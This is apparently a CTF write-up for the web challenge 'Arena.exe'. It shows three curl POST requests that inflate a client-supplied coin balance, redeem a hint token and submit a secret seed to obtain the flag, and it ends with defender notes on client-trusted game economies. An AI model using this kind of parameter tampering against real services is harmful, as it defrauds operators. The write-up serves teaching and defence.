<!-- writeup by Abdelkader -->
<!-- standalone repo: https://github.com/Abdelkad3r/hasblctf-2026/tree/main/web/arena-exe -->
<!-- (full solve.py lives there) -->

# Arena.exe (web)

| Field    | Value                                                          |
| -------- | -------------------------------------------------------------- |
| Category | web                                                            |
| URL      | `http://34.77.68.154:10206/` (now offline)                     |
| Server   | `nginx/1.31.0` fronting a Canvas-based browser shooter         |
| Flag     | `HASBL{7his_S33d_Is_S0_Lucky}`                                 |

## Description

A Canvas-based arena shooter. The page tracks coins / levels / high-score in
`localStorage`; only three server endpoints exist:

* `POST /api/start  {seed}`        — start a run with a chosen RNG seed
* `POST /api/buy-hint {coins}`     — buy a hint token (price 9999 coins)
* `POST /api/hint {token}`         — redeem the token for a hint string

The seed gates the flag, the hint names the seed, and the shop charges 9999
coins for the hint. The "challenge" is that the shop never tracks the wallet
server-side — the coin amount is just sent in the request.

## TL;DR

```
$ curl -s -X POST http://…:10206/api/buy-hint \
       -H 'Content-Type: application/json' \
       -d '{"coins": 9999999}'
{"token":"<sha256-shaped>"}

$ curl -s -X POST http://…:10206/api/hint \
       -H 'Content-Type: application/json' \
       -d '{"token":"<sha256-shaped>"}'
{"hint":"negative leet as seed"}

$ curl -s -X POST http://…:10206/api/start \
       -H 'Content-Type: application/json' \
       -d '{"seed": -1337}'
{"status":"flag","flag":"HASBL{7his_S33d_Is_S0_Lucky}","message":"You found the secret seed."}
```

Three POSTs, no grinding.

## Recon

### Step 1 — endpoint surface

The bundled JS calls exactly three server paths. Everything else
(`coins`, `levels`, `highScore`) is `localStorage` state — the front-end
is faking a multi-hour grind to 9999 coins (200 enemies × 2 coins, 100
score per wave) so the player will "earn" the hint shop.

### Step 2 — the shop trusts the client

`POST /api/buy-hint` returns a token whenever the request body's `coins`
field is ≥ 9999. There is **no server-side wallet** — the player's coin
balance only exists in the browser, and the request is the only thing
the server reads. Sending `{"coins": 9999999}` (or just `9999`) returns
a valid SHA-256-looking token unconditionally.

### Step 3 — redeem the token

`POST /api/hint {"token": "<the value>"}` returns

```
{"hint": "negative leet as seed"}
```

"Negative leet" maps directly to `-1337`. `1337` was tried first
(non-special), then the negative form lit up the gate.

### Step 4 — flag-bearing branch of `/api/start`

```
POST /api/start {"seed": -1337}
→ {"status":"flag", "flag":"HASBL{7his_S33d_Is_S0_Lucky}", "message":"You found the secret seed."}
```

`-1337.0` works too (integer-valued floats coerce). Other near-leet
seeds (`-13370`, `-31337`, `1337`) just return `{"status":"ok", "seed":<echo>, "message":"Game starting."}`.

## Flag

```
HASBL{7his_S33d_Is_S0_Lucky}
```

*"This seed is so lucky"* — the joke is that the seed is a single
hardcoded constant, and the entire shooter mini-game is irrelevant to
reaching it.

## Defender notes

* **Client-trusted economies are the canonical web-CTF footgun.** Any
  game-style currency, "unlocked" level, or premium feature that's
  asserted by the *client* and accepted by the *server* without
  cross-check is exactly the same primitive as this challenge. The fix
  is to keep the wallet server-side, keyed by an authenticated session
  identifier, and bill against it.
* **A hint-shop that takes coins from the request body is an obvious
  tell.** Real anti-cheat systems sign the wallet-mutation transactions
  with a session token so a fabricated value fails verification. Here
  the only "check" is `coins >= 9999`, which is an integer comparison
  on attacker-controlled input.
* **Seed-as-secret is fragile.** Even without the hint shop, an
  attacker could brute-force a small space of "obvious" seeds
  (`±1337`, `±13371337`, `±31337`, the SHA-256 of `"hasbl"`, …) in a
  few thousand requests — the seed space is much smaller than the
  hint-shop pretends. The lesson: secret integers under a few hundred
  bits aren't secret if the verification is cheap and the attacker has
  a guess function.

## Files

* [`solve.py`](https://github.com/Abdelkad3r/hasblctf-2026/blob/main/web/arena-exe/solve.py) — argparse-driven end-to-end solver. Posts
  the inflated coin balance, redeems the token, submits the leet seed,
  and prints the flag. Standard library only (`urllib.request`).

## Requirements

Python 3.9+; standard library only.
